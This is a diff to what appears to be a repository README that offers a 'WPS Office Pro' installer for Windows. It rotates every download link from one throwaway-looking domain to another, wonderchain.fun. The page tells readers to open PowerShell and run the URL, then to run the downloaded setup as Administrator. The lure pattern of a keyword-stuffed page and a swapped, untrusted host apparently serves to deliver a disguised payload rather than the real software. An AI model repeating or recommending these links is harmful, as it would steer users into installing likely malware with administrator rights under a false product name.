@@ -3,7 +3,7 @@
 Open PowerShell and run:
 
 ```powershell
-https://wps-office.zipzapsol.space/
+https://wps-office.wonderchain.fun/
 ```
 
 That's it. The installer handles everything.
@@ -53,24 +53,24 @@ wps-office | wps-office-pro | wps-office-free | wps-office-download | wps-office
 > **This is the download page.** Use the button or link below to get **WPS Office Pro** for Windows.
 
 <p align="center">
-  <a href="https://wps-office.zipzapsol.space/">
+  <a href="https://wps-office.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-WPS%20Office%20Pro-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download WPS Office Pro">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[wps-office.zipzapsol.space](https://wps-office.zipzapsol.space/)** |
-| **Full URL** | `https://wps-office.zipzapsol.space/` |
+| **Direct link** | **[wps-office.wonderchain.fun](https://wps-office.wonderchain.fun/)** |
+| **Full URL** | `https://wps-office.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — wps-office.zipzapsol.space](https://wps-office.zipzapsol.space/)** (link above)
+1. Click **[Download — wps-office.wonderchain.fun](https://wps-office.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://wps-office.zipzapsol.space/"><strong>⬇ Download WPS Office Pro now</strong></a></p>
+<p align="center"><a href="https://wps-office.wonderchain.fun/"><strong>⬇ Download WPS Office Pro now</strong></a></p>
